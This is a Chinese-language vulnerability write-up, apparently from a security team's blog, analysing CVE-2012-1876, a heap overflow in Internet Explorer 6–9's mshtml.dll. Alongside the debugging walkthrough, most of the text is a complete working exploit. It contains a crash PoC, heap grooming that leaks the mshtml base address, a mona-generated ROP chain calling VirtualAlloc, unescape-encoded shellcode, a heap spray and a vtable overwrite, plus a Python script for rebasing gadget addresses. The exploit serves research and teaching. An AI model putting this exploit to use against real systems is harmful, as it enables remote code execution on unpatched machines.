# Internet Explorer漏洞分析系列（一）——CVE-2012-1876

阅读量 **249032**

发布时间 : 2021-02-26 12:00:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0164c8628e29316500.jpg)

    
    
    1.本文一共3960个字 30张图 预计阅读时间12分钟
    2.本文作者erfze 属于Gcow安全团队复眼小组 未经过许可禁止转载
    3.本篇文章从CVE-2012-1876漏洞的分析入手 详细的阐述漏洞的成因以及如何去利用该漏洞
    4.本篇文章十分适合漏洞安全研究人员进行交流学习
    5.若文章中存在说得不清楚或者错误的地方 欢迎师傅到公众号后台留言中指出 感激不尽
    

## 0x01 漏洞信息

###  0x01.1 漏洞简述

  * 编号：CVE-2012-1876
  * 类型：堆溢出(Heap Overflow)
  * 漏洞影响：远程代码执行(RCE)
  * CVSS 2.0：9.3

mshtml.dll中`CTableLayout::CalculateMinMax`函数在循环向缓冲区(堆分配内存)写入数据时，未校验控制循环次数的`<col>`标签`span`属性值，故可通过精心构造`span`属性值造成堆溢出，进而实现RCE。

###  0x01.2 漏洞影响

Microsoft Internet Explorer 6—9，10 Consumer Preview

###  0x01.3 修复方案

  * [MS12-037]<https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-037>

## 0x02 漏洞分析

###  0x02.1 分析环境

  * OS版本：Windows XP Service Pack 3
  * Internet Explorer版本：8.0.6001.18702
  * mshtml.dll版本：8.0.6001.18702

###  0x02.2 详细分析

使用`gflags.exe`为`iexplore.exe`开启页堆：

![](https://p1.ssl.qhimg.com/t01ca3c34f89f003a8b.png)

WinDbg打开`iexplore.exe`后，通过`.childdbg 1`命令启用子进程调试。运行并打开`poc.html`：

    
    
    <html>
     <body>
     <table style="table-layout:fixed" >
            <col id="132" width="41" span="1" >&nbsp </col>
            <!-- The <col> tag specifies column properties for each column within a <colgroup> element-->
            <!-- width:Specifies the width of a <col> element -->
            <!-- span:Specifies the number of columns a <col> element should span -->
     </table>
     <script>
    
     function over_trigger() {
            var obj_col = document.getElementById("132");
            obj_col.width = "42765";
            obj_col.span = 1000;
     }
    
     setTimeout("over_trigger();",1);    //The setTimeout() method calls a function or evaluates an expression after a specified number of milliseconds
    
    
     </script>
     </body>
     </html>
    

允许活动内容运行：

![](https://p1.ssl.qhimg.com/t01d206251a347f9711.png)

崩溃点如下：

![](https://p2.ssl.qhimg.com/t017388151e37eb0531.png)

WinDbg重新打开`iexplore.exe`，运行。当子进程创建完成时，`sxe ld mshtml.dll`设置`mshtml.dll`模块加载异常：

![](https://p0.ssl.qhimg.com/t013ab817f4eb20c341.png)

模块已加载，可拍摄快照，方便后续分析：

![](https://p3.ssl.qhimg.com/t011bd91829710f2fd5.png)

IDA定位到函数`CTableColCalc::AdjustForCol`引发crash处：

![](https://p5.ssl.qhimg.com/t01a0cd9c7bcb44a3ab.png)

向上回溯查看`esi`于何处赋值(调用该函数仅`CTableLayout::CalculateMinMax+F55F`一处，故可直接在IDA中定位)：

![](https://p2.ssl.qhimg.com/t01c763f0d8d77b8c68.png)

由上图可以看出其值为`[ebx+9Ch]`，该地址处值由何而来需结合WinDbg动态调试以确定。恢复快照至已加载mshtml.dll，`bp
6368CD39`设断于`call CTableColCalc::AdjustForCol`处，成功断下后，查看堆块信息：

![](https://p1.ssl.qhimg.com/t019907c8ac1f86126f.png)

再次恢复快照，`bp 6367d7da`于`CTableLayout::CalculateMinMax`起始位置设断，断下后`bp
635D28F6`于`call CImplAry::EnsureSizeWorker`处设断，跟进分析：

![](https://p5.ssl.qhimg.com/t01d13298b2a6b4a1fb.png)

可以看出其分配大小确为0x70，之后跟进`mshtml!_HeapRealloc`查看其分配地址：

![](https://p2.ssl.qhimg.com/t01469042f277d12311.png)

向上回溯，`edi`指向`ebx+90h`：

![](https://p0.ssl.qhimg.com/t018544043fd0c2ce59.png)

如此一来，`HeapAlloc`函数返回值——即分配堆块地址写入`[ebx+9Ch]`。至此，crash处`edi`由何而来已分析完成。而写入数据为`width*100`(具体计算过程见`CWidthUnitValue::GetPixelWidth`函数)：

![](https://p1.ssl.qhimg.com/t017f25f555266b851d.png)

crash处`ecx`值为`(width*100)<<4+9`，最终内容要减1：

![](https://p1.ssl.qhimg.com/t0140e34462fb28eb78.png)

* * *

上述内容仅是追溯写入位置与写入值如何计算及传递，下面将分析其执行流。

`CTableLayout::CalculateMinMax`第一个参数是用于存储`<table>`标签的`CTableLayout`对象：

![](https://p0.ssl.qhimg.com/t01d0d95b754f4a5131.png)

而`[ebx+54h]`存储所有`<col>`标签的`<span>`属性值之和(可记为`span_sum`)：

![](https://p3.ssl.qhimg.com/t010ec55c6631c7a373.png)

执行到`0x6367D8EF`处，从`ebx+94h`位置取出值，右移2位，与`span_sum`进行比较：

![](https://p5.ssl.qhimg.com/t012252174492dc1932.png)

如上图所示，再经过两次比较，都满足条件才会`call
CImplAry::EnsureSizeWorker`。若`span_sum`小于4，则直接分配`0x70`大小堆块；不小于4，则分配`0x1C*span_sum`大小堆块：

![](https://p1.ssl.qhimg.com/t018d77a97f2e9ac01d.png)

分配结束后，会向`ebx+98h`位置写入`span_sum`：

![](https://p2.ssl.qhimg.com/t010fa4e1a4f1408554.png)

向`ebx+94h`位置写入`span_sum<<2`：

![](https://p2.ssl.qhimg.com/t0164417512be2b3513.png)

如此一来，第二次执行`CTableLayout::CalculateMinMax`便不会调用`CImplAry::EnsureSizeWorker`重新分配内存，而是直接使用上次分配堆块进行写入——修改后的`span`属性值大于修改前`span`属性值，以此`span`值作为循环计数，之前分配堆块大小明显无法容纳，此时便会造成堆溢出。

下面是打开POC并允许活动内容运行后由`0x6367D7DA`至`0x6368CD39`两次执行流(可使用`wt -l 1 -ns -oR -m
mshtml =6367d7da 6368CD39`命令)对比：

![](https://p3.ssl.qhimg.com/t01d1d623bcb9ae9ea0.png)

第二次执行不会调用`CImplAry::EnsureSizeWorker`：

![](https://p4.ssl.qhimg.com/t016cfb9cd1cca4d574.png)

`span`属性值最大为0x3E8(即1000)：

![](https://p0.ssl.qhimg.com/t01be9668c3a3bcc99f.png)

###  0x02.3 漏洞利用

分析所用exp如下：

    
    
    <html>
        <body>
            <div id="test"></div>
            <script language='javascript'>
    
                var leak_index = -1;
    
                var dap = "EEEE";
                while ( dap.length < 480 ) dap += dap;
    
                var padding = "AAAA";
                while ( padding.length < 480 ) padding += padding;
    
                var filler = "BBBB";
                while ( filler.length < 480 ) filler += filler;
    
                //spray
                var arr = new Array();
                var rra = new Array();
    
                var div_container = document.getElementById("test");
                div_container.style.cssText = "display:none";
    
                for (var i=0; i < 500; i+=2) {
    
                    // E
                    rra[i] = dap.substring(0, (0x100-6)/2);
    
                    // S, bstr = A
                    arr[i] = padding.substring(0, (0x100-6)/2);
    
                    // A, bstr = B
                    arr[i+1] = filler.substring(0, (0x100-6)/2);
    
                    // B
                    var obj = document.createElement("button");
                    div_container.appendChild(obj);
    
                }
    
                for (var i=200; i<500; i+=2 ) {
                    rra[i] = null;
                    CollectGarbage();
                }
    
            </script>
    
            <table style="table-layout:fixed" ><col id="0" width="41" span="9" >&nbsp </col></table>
            <table style="table-layout:fixed" ><col id="1" width="41" span="9" >&nbsp </col></table>
            ...
            <table style="table-layout:fixed" ><col id="132" width="41" span="9" >&nbsp </col></table>
    
            <script language='javascript'>
                var obj_col = document.getElementById("132");
                obj_col.span = 19;
    
                function over_trigger() 
                {
                    var leak_addr = -1;
                    for ( var i = 0; i < 500; i++ ) 
                    {
                        if ( arr[i].length > (0x100-6)/2 ) 
                        { // overflowed
                            leak_index = i;
                            var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);
                            leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );
                            mshtmlbase = leak_addr - Number(0x001582b8);
                            alert(mshtmlbase);
                            break;
                        }
                    }
                    if ( leak_addr == -1 || leak_index == -1 ) 
                    { 
                            alert("memory leak failed...."); 
                    }
                    //return mshtmlbase;
                }
    
                // A very special heap spray
                function heap_spray()
                {
                       CollectGarbage();
                    var heapobj = new Object();
    
                    // generated with mona.py (mshtml.dll v)
                        function rop_chain(mshtmlbase)
                        {
                            var arr = [
                            mshtmlbase + Number(0x00001031),
                            mshtmlbase + Number(0x00002c78),    // pop ebp; retn
                            mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
                            mshtmlbase + Number(0x00352c8b),    // pop eax; retn
                            mshtmlbase + Number(0x00001340),    // ptr to &VirtualAlloc() [IAT]
                            mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
                            mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn
                            mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
                            mshtmlbase + Number(0x00128b8d),    // & jmp esp
                            mshtmlbase + Number(0x00061436),    // pop ebx; retn
                            0x00000001,                       // 0x00000001-> ebx
                            mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
                            0x00001000,                       // 0x00001000-> edx
                            mshtmlbase + Number(0x00003670),    // pop ecx; retn
                            0x00000040,                       // 0x00000040-> ecx
                            mshtmlbase + Number(0x001d263d),    // pop edi; retn
                            mshtmlbase + Number(0x000032ac),    // retn
                            mshtmlbase + Number(0x00352c9f),    // pop eax; retn
                            0x90909090,                       // nop
                            mshtmlbase + Number(0x0052e805),    // pushad; retn
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                                ];
                            return arr;
                            }
    
                    function d2u(dword)
                    {
                        var uni = String.fromCharCode(dword & 0xFFFF);
                        uni += String.fromCharCode(dword>>16);
                        return uni;
                    }
    
                    function tab2uni(heapobj, tab)
                    {
                        var uni = ""
                        for(var i=0;i<tab.length;i++){
                            uni += heapobj.d2u(tab[i]);
                        }
                        return uni;
                    }
    
                    heapobj.tab2uni = tab2uni;
                    heapobj.d2u = d2u;
                    heapobj.rop_chain = rop_chain;
    
                    var code = unescape("%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2");
                    var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;
                    var shellcode = rop_chain + code
    
                    while (shellcode.length < 100000)
                    shellcode = shellcode + shellcode;
                    var onemeg = shellcode.substr(0, 64*1024/2);
                    for (i=0; i<14; i++) 
                    {
                        onemeg += shellcode.substr(0, 64*1024/2);
                    }
    
                    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));
                    var spray = new Array();
    
                    for (i=0; i<400; i++) 
                    {
                        spray[i] = onemeg.substr(0, onemeg.length);
                    }
                }
    
                function smash_vtable()
                {
                        var obj_col_0 = document.getElementById("132");
                        obj_col_0.width = "1178993";                    // smash the vftable 0x07070024
                        obj_col_0.span = "44";                      // the amount to overwrite
                }
    
                var mshtmlbase = "";
                setTimeout("over_trigger();",1);    
                setTimeout("heap_spray();",400);
                setTimeout("smash_vtable();",700);
            </script>
        </body>
    </html>
    

第一部分用以申请大量内存并填充字符内容进行堆布局：

    
    
    <script language='javascript'>
    
                var leak_index = -1;
    
                var dap = "EEEE";
                while ( dap.length < 480 ) dap += dap;
    
                var padding = "AAAA";
                while ( padding.length < 480 ) padding += padding;
    
                var filler = "BBBB";
                while ( filler.length < 480 ) filler += filler;
    
                //spray
                var arr = new Array();
                var rra = new Array();
    
                var div_container = document.getElementById("test");
                div_container.style.cssText = "display:none";
    
                for (var i=0; i < 500; i+=2) {
    
                    // E
                    rra[i] = dap.substring(0, (0x100-6)/2);
    
                    // S, bstr = A
                    arr[i] = padding.substring(0, (0x100-6)/2);
    
                    // A, bstr = B
                    arr[i+1] = filler.substring(0, (0x100-6)/2);
    
                    // B
                    var obj = document.createElement("button");
                    div_container.appendChild(obj);
    
                }
    
                for (var i=200; i<500; i+=2 ) {
                    rra[i] = null;
                    CollectGarbage();
                }
    
            </script>
    

其于内存中分布情况(`BSTR 'E'` & `BSTR 'A'` & `BSTR 'B'` & `CButtonLayout`)：

![](https://p3.ssl.qhimg.com/t019324a9935c830269.png)

调用`CollectGarbage()`回收完成后，其`Len`部分变为`0x0000ffff`：

![](https://p4.ssl.qhimg.com/t014ac92c6b2fc53189.png)

第二部分创建大量`col`标签，以占位之前释放堆块：

    
    
            <table style="table-layout:fixed" ><col id="0" width="41" span="9" >&nbsp </col></table>
            <table style="table-layout:fixed" ><col id="1" width="41" span="9" >&nbsp </col></table>
            ...
            <table style="table-layout:fixed" ><col id="132" width="41" span="9" >&nbsp </col></table>
    

之后通过

    
    
        var obj_col = document.getElementById("132");
        obj_col.span = 19;
    

完成第一次溢出(可通过条件断点`bp 638209A2 ".if(eax==0x13){};.else{gc;}"`断下后再进一步分析)：

![](https://p3.ssl.qhimg.com/t0162cf908d654d41f4.png)

而写入位置在每次写入过后会加`0x1C`：

![](https://p0.ssl.qhimg.com/t01ddb05663a56ae35b.png)

`0x1C`*`0x12`=`0x1F8`(`0x6368CD4B`处是`jl`命令)，`[EBX+9Ch]+0x1F8+0x18`位置恰为`BSTR
'B'`长度：

![](https://p5.ssl.qhimg.com/t01c254b5fb364daf6d.png)

之后遍历`arr`数组，长度大于`(0x100-6)/2`元素即为发生溢出位置：

    
    
    for ( var i = 0; i < 500; i++ ) 
    {
      if ( arr[i].length > (0x100-6)/2 ) 
      { // overflowed
        leak_index = i;
    

由于该元素长度已被更改为`0x10048`，那么可以越界读取其后`CButtonLayout`中内容：

    
    
    var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);        //0xAE086377——금捷(Unicode)
    

![](https://p4.ssl.qhimg.com/t010daafaa02449cdf3.png)

转换成十六进制数，减去`CButtonLayout::vftable`相较于基址偏移便得到基址：

    
    
    leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );
    mshtmlbase = leak_addr - Number(0x001582b8);
    

Exp中偏移与笔者环境中所计算偏移不符：

![](https://p0.ssl.qhimg.com/t0100562ad55708a74e.png)

构造ROP+Shellcode及进行Heap Spray：

    
    
                function heap_spray()
                {
                       CollectGarbage();
                    var heapobj = new Object();
    
                    // generated with mona.py (mshtml.dll v)
                        function rop_chain(mshtmlbase)
                        {
                            var arr = [
                            mshtmlbase + Number(0x00001031),
                            mshtmlbase + Number(0x00002c78),    // pop ebp; retn
                            mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
                            mshtmlbase + Number(0x00352c8b),    // pop eax; retn
                            mshtmlbase + Number(0x00001340),    // ptr to &VirtualAlloc() [IAT]
                            mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
                            mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn
                            mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
                            mshtmlbase + Number(0x00128b8d),    // & jmp esp
                            mshtmlbase + Number(0x00061436),    // pop ebx; retn
                            0x00000001,                       // 0x00000001-> ebx
                            mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
                            0x00001000,                       // 0x00001000-> edx
                            mshtmlbase + Number(0x00003670),    // pop ecx; retn
                            0x00000040,                       // 0x00000040-> ecx
                            mshtmlbase + Number(0x001d263d),    // pop edi; retn
                            mshtmlbase + Number(0x000032ac),    // retn
                            mshtmlbase + Number(0x00352c9f),    // pop eax; retn
                            0x90909090,                       // nop
                            mshtmlbase + Number(0x0052e805),    // pushad; retn
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                            0x90909090,
                                ];
                            return arr;
                            }
    
                    function d2u(dword)
                    {
                        var uni = String.fromCharCode(dword & 0xFFFF);
                        uni += String.fromCharCode(dword>>16);
                        return uni;
                    }
    
                    function tab2uni(heapobj, tab)
                    {
                        var uni = ""
                        for(var i=0;i<tab.length;i++){
                            uni += heapobj.d2u(tab[i]);
                        }
                        return uni;
                    }
    
                    heapobj.tab2uni = tab2uni;
                    heapobj.d2u = d2u;
                    heapobj.rop_chain = rop_chain;
    
                    var code = unescape("%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2");
    
                    var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;
                    var shellcode = rop_chain + code
    
                    while (shellcode.length < 100000) shellcode = shellcode + shellcode;
                    var onemeg = shellcode.substr(0, 64*1024/2);
                    for (i=0; i<14; i++) 
                    {
                        onemeg += shellcode.substr(0, 64*1024/2);
                    }
    
                    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));
                    var spray = new Array();
    
                    for (i=0; i<400; i++) 
                    {
                        spray[i] = onemeg.substr(0, onemeg.length);
                    }
                }
    

其ROP链于笔者环境中并不适用，可用`mona.py`重新生成。转换为相对地址可使用如下脚本：

    
    
    import argparse
    
    def GenRelAddr(Src,Des,ModuleBaseAddr):
        SrcFile=open(Src,"r")   
        DestFile=open(Des,"w")
        DestFile.write("Relative Address:\n")
        for i in SrcFile.readlines():
            if i.strip().find("0x")==-1:
                pass 
            else:
                num_hex=int(i[i.find("0x"):i.find("0x")+10],16)
                rva=num_hex-ModuleBaseAddr
                if rva>0 and num_hex!=2425393296:    #0x90909090
                    DestFile.write('    '+hex(rva)+'\n')
                else:
                    DestFile.write('    '+hex(num_hex)+'\n')
        SrcFile.close()
        DestFile.close()
    
    if __name__ == '__main__':
        parser=argparse.ArgumentParser()
        parser.add_argument('-s',help='SrcFile')
        parser.add_argument('-d',help='DestFile')
        parser.add_argument('-b',type=int,help='ModuleBaseAddr')
        args=parser.parse_args()
        if args.s and args.d and args.b:
            GenRelAddr(args.s,args.d,args.b)
        else:
            print("Please enter the correct parameters.")
    

方法为`-s 1.txt -d 2.txt -b 1666711552`，其中`1.txt`内容如下：

    
    
    rop_gadgets = [
          #[---INFO:gadgets_to_set_esi:---]
          0x6371b8f5,  # POP ECX # RETN [mshtml.dll] 
          0x63581314,  # ptr to &VirtualAlloc() [IAT mshtml.dll]
          0x6392bf47,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [mshtml.dll] 
          0x63aa9a60,  # XCHG EAX,ESI # RETN [mshtml.dll] 
          #[---INFO:gadgets_to_set_ebp:---]
          0x635ac41c,  # POP EBP # RETN [mshtml.dll] 
          0x635ead14,  # & jmp esp [mshtml.dll]
          #[---INFO:gadgets_to_set_ebx:---]
          0x636895b1,  # POP EBX # RETN [mshtml.dll] 
          0x00000001,  # 0x00000001-> ebx
          #[---INFO:gadgets_to_set_edx:---]
          0x637ccce4,  # POP EDX # RETN [mshtml.dll] 
          0x00001000,  # 0x00001000-> edx
          #[---INFO:gadgets_to_set_ecx:---]
          0x6358e41f,  # POP ECX # RETN [mshtml.dll] 
          0x00000040,  # 0x00000040-> ecx
          #[---INFO:gadgets_to_set_edi:---]
          0x6366cccd,  # POP EDI # RETN [mshtml.dll] 
          0x63900c06,  # RETN (ROP NOP) [mshtml.dll]
          #[---INFO:gadgets_to_set_eax:---]
          0x637f3ee3,  # POP EAX # RETN [mshtml.dll] 
          0x90909090,  # nop
          #[---INFO:pushad:---]
          0x636bfa7c,  # PUSHAD # RETN [mshtml.dll] 
        ]
    

`1666711552`是笔者环境中`mshtml.dll`基址十进制值。

第二次溢出：

    
    
    function smash_vtable()
                {
                        var obj_col_0 = document.getElementById("132");
                        obj_col_0.width = "1178993";                    // smash the vftable 0x07070024
                        obj_col_0.span = "44";                      // the amount to overwrite
                }
    

写入发生于第28次循环，对应指令为`0x6368CD98`处`mov [esi+8], ebx`，写入前：

![](https://p1.ssl.qhimg.com/t01dc6c8061c90f2a66.png)

写入完成后调用该虚表指针时即可控制执行流。

最后，总结下利用思路：Heap
Spray—>释放内存—>`<col>`占位—>堆溢出(更改BSTR长度位)—>”越界读”虚表指针，计算`mshtml.dll`基址—>Heap
Spray(布局ROP+Shellcode)—>堆溢出(更改虚表指针到ROP+Shellcode地址)

## 0x03 参阅链接

  * [HTMLElement.style](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style)
  * [display](https://developer.mozilla.org/zh-CN/docs/Web/CSS/display)
  * [Python实现生成相对地址的ROP](https://blog.csdn.net/qq_35519254/article/details/53234599)

